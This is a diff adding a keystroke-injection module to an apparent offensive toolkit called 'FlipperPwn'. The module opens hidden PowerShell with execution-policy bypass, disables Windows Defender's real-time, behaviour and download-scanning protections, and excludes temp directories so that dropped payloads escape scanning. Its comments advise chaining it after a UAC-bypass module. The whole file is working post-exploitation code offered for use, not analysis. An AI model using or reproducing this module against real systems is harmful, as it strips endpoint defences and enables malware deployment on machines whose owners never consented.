@@ -1,0 +1,50 @@
+# FlipperPwn Module: Disable Windows Defender Real-Time Protection
+# Disables Defender's real-time monitoring and adds a path exclusion for %TEMP%.
+# REQUIRES ADMIN — run uac_bypass_fodhelper first if not already elevated,
+# or chain with add_user after gaining admin via another path.
+#
+# Note: Tamper Protection (Windows 10 1903+) must be disabled via the Settings UI
+# or via MDM/Group Policy before these commands will take effect. If Tamper Protection
+# is on, Set-MpPreference will return an error but won't crash.
+#
+# To re-enable: Set-MpPreference -DisableRealtimeMonitoring $false
+
+NAME disable_defender
+DESCRIPTION Disable Windows Defender real-time protection and add a TEMP exclusion (requires admin)
+CATEGORY post
+PLATFORMS WIN
+
+# No options required
+
+PLATFORM WIN
+  # Open hidden PowerShell via Run dialog — must already be running as admin
+  # (run uac_bypass_fodhelper with COMMAND=powershell.exe first)
+  DELAY 500
+  GUI r
+  DELAY 300
+  STRING powershell -w h -nop -ep bypass
+  ENTER
+  DELAY 1000
+  # Disable real-time monitoring (stops active file scanning)
+  STRING Set-MpPreference -DisableRealtimeMonitoring $true
+  ENTER
+  DELAY 500
+  # Disable behavior monitoring (stops heuristic/behavioral detection)
+  STRING Set-MpPreference -DisableBehaviorMonitoring $true
+  ENTER
+  DELAY 500
+  # Disable IOAV protection (stops scanning of downloaded files)
+  STRING Set-MpPreference -DisableIOAVProtection $true
+  ENTER
+  DELAY 500
+  # Add TEMP directory as an exclusion path — payloads dropped here won't be scanned
+  STRING Add-MpPreference -ExclusionPath "$env:TEMP"
+  ENTER
+  DELAY 500
+  # Add Windows\Temp as exclusion as well (system temp, often used by implants)
+  STRING Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+  ENTER
+  DELAY 500
+  # Verify current state
+  STRING Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,BehaviorMonitorEnabled,AMRunningMode | Format-List
+  ENTER
